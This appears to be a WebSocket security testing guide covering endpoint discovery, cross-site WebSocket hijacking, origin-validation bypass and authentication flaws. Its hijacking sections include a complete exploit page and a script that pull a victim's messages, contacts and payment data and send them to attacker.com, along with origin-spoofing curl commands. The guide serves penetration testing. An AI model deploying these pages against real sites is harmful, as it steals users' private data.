<websocket_security_guide>
<title>WEBSOCKET SECURITY TESTING</title>

<critical>WebSocket connections bypass traditional HTTP security controls. The persistent, bidirectional nature of WebSockets creates unique attack surfaces including cross-site WebSocket hijacking (CSWSH), message injection, and authentication bypass. Unlike HTTP, WebSocket connections do not have built-in CORS protection.</critical>

<scope>
- Cross-Site WebSocket Hijacking (CSWSH)
- Origin validation bypass
- Authentication and authorization flaws
- Message injection and manipulation
- Denial of service attacks
- Data leakage through WebSocket channels
- Protocol-level attacks (frame manipulation)
</scope>

<methodology>
1. Identify WebSocket endpoints and understand the message protocol.
2. Test origin validation by connecting from attacker-controlled domains.
3. Examine authentication: how are WebSocket connections authenticated?
4. Analyze message format for injection and manipulation opportunities.
5. Test authorization: can messages access resources of other users?
</methodology>

<websocket_detection>
<endpoint_discovery>
{% raw %}
# Common WebSocket endpoint patterns
wss://example.com/ws
wss://example.com/websocket
wss://example.com/socket.io/  # Socket.IO
wss://example.com/sockjs/     # SockJS
wss://example.com/cable       # ActionCable (Rails)
wss://example.com/graphql     # GraphQL subscriptions

# Detection in HTTP upgrade
GET /socket HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

# Look for 101 Switching Protocols response
{% endraw %}
</endpoint_discovery>

<traffic_analysis>
{% raw %}
# WebSocket frame types
0x0: Continuation frame
0x1: Text frame
0x2: Binary frame
0x8: Connection close
0x9: Ping
0xA: Pong

# Identify message patterns
# JSON messages
{"type": "subscribe", "channel": "updates"}
{"type": "message", "content": "Hello"}

# Binary protocols (protobuf, msgpack)
# May require protocol-specific analysis
{% endraw %}
</traffic_analysis>
</websocket_detection>

<cswsh_attacks>
<basic_hijacking>
{% raw %}
# Cross-Site WebSocket Hijacking (CSWSH)
# Attacker page connects to victim's WebSocket server

<script>
// Hosted on attacker.com
var ws = new WebSocket('wss://target.com/socket');

ws.onopen = function() {
  console.log('Connected to target');
  // Send commands as the victim
  ws.send(JSON.stringify({type: 'get_profile'}));
};

ws.onmessage = function(event) {
  // Steal victim's data
  fetch('https://attacker.com/log?data=' + 
        encodeURIComponent(event.data));
};
</script>

# If target doesn't validate Origin header:
# - Attacker page opens WebSocket to target
# - Browser sends victim's cookies automatically
# - Attacker receives victim's WebSocket messages
{% endraw %}
</basic_hijacking>

<origin_validation_bypass>
{% raw %}
# Test Origin header validation

# Standard origin
Origin: https://attacker.com

# Null origin (sandboxed iframe, data: URL)
Origin: null

# Origin spoofing attempts (won't work in browser, but test server)
# Using curl/scripts:
curl --include \
  --no-buffer \
  --header "Connection: Upgrade" \
  --header "Upgrade: websocket" \
  --header "Host: target.com" \
  --header "Origin: https://target.com" \
  --header "Sec-WebSocket-Key: xxx" \
  --header "Sec-WebSocket-Version: 13" \
  https://target.com/socket

# Subdomain bypass
Origin: https://attacker.target.com
Origin: https://target.com.attacker.com

# Protocol confusion
Origin: http://target.com  # HTTP when HTTPS expected
{% endraw %}
</origin_validation_bypass>

<exploitation>
{% raw %}
<!-- Full CSWSH exploit page -->
<!DOCTYPE html>
<html>
<head>
  <title>Innocent Page</title>
</head>
<body>
<script>
var ws = new WebSocket('wss://vulnerable.com/socket');
var stolen = [];

ws.onopen = function() {
  // Request sensitive data
  ws.send('{"action": "get_messages"}');
  ws.send('{"action": "get_contacts"}');
  ws.send('{"action": "get_payment_methods"}');
};

ws.onmessage = function(e) {
  stolen.push(e.data);
  // Exfiltrate periodically
  if (stolen.length % 5 === 0) {
    navigator.sendBeacon('https://attacker.com/collect', 
                         JSON.stringify(stolen));
  }
};

// Keep connection alive
setInterval(function() {
  if (ws.readyState === WebSocket.OPEN) {
    ws.send('{"action": "ping"}');
  }
}, 30000);
</script>
</body>
</html>
{% endraw %}
</exploitation>
</cswsh_attacks>

<authentication_attacks>
<token_in_url>
{% raw %}
# If authentication token is in WebSocket URL:
wss://example.com/socket?token=JWT_TOKEN

# Risks:
# - Token in server logs
# - Token in Referer headers
# - Token exposure in browser history
# - Token in proxy logs

# Test token validation:
# - Expired tokens
# - Tokens from different users
# - Modified tokens
{% endraw %}
</token_in_url>

<cookie_authentication>
{% raw %}
# If using cookies for authentication:
# - Susceptible to CSWSH
# - Test SameSite cookie attribute effect

# SameSite=Strict: Blocks cross-site WebSocket with cookies
# SameSite=Lax: May still send cookies for WebSocket
# SameSite=None: Always sends cookies (requires Secure)
{% endraw %}
</cookie_authentication>

<auth_bypass>
{% raw %}
# Test authentication bypass:

# 1. Connect without any authentication
var ws = new WebSocket('wss://target.com/socket');

# 2. Connect with invalid token
wss://target.com/socket?token=invalid

# 3. Connect and send commands before authenticating
ws.onopen = function() {
  ws.send('{"action": "get_admin_data"}');
};

# 4. Re-authenticate as different user mid-connection
ws.send('{"action": "auth", "token": "other_user_token"}');
{% endraw %}
</auth_bypass>
</authentication_attacks>

